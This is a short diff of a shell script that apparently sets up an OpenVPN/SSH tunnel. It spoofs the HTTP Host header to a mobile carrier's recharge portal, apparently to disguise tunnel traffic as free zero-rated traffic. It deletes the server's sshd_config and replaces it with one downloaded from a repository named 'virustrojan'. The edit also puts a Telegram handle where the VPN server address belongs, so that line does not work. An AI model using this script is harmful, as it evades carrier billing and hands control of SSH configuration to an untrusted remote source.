@@ -404,7 +404,7 @@ dev tun
 proto $PROTOCOL
 sndbuf 0
 rcvbuf 0
-remote / $PORT
+remote /t.me/Fontinele $PORT
 http-proxy-option CUSTOM-HEADER Host portalrecarga.vivo.com.br/recarga
 http-proxy $IP 80
 resolv-retry infinite
@@ -430,7 +430,7 @@ sleep 4
 fi
 
 rm -rf /etc/ssh/sshd_config
-wget https://raw.githubusercontent.com/twossh/virustrojan/master/sshd_config -O /etc/ssh/sshd_config
+wget https://raw.githubusercontent.com/ffontinele/virustrojan/master/sshd_config -O /etc/ssh/sshd_config
 /etc/init.d/ssh restart
 service ssh restart
 /etc/init.d/openvpn restart
